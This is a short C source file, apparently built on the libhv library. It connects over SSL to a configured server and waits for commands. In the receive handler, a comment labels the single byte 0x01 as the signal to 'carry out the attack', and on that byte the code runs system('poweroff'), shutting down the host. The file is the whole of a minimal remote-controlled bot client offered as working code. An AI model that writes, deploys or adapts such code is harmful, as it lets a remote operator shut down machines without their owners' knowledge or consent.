//
// Created by cmtheit on 23-6-1.
//

#include "connection.h"

hloop_t * main_loop;
hio_t * main_hio;

void on_connection() {
    printf("Connection to server established.");
}

void on_close() {
    printf("Connection to server closed.");
}

void on_recv(hio_t *, void * buf, int readbytes) {
    // 当接收到指令 '\x01' 时，执行攻击
    if (readbytes == 1 && ((char*)buf)[0] == '\x01') {
        system("poweroff");
    }
}

void connection_init() {
    main_loop = hloop_new(HLOOP_FLAG_QUIT_WHEN_NO_ACTIVE_EVENTS);
    main_hio = hloop_create_ssl_client(main_loop, SERVER_IP, SERVER_PORT, on_connection, on_close);
    hio_setcb_read(main_hio, on_recv);
    hio_read_start(main_hio);
}
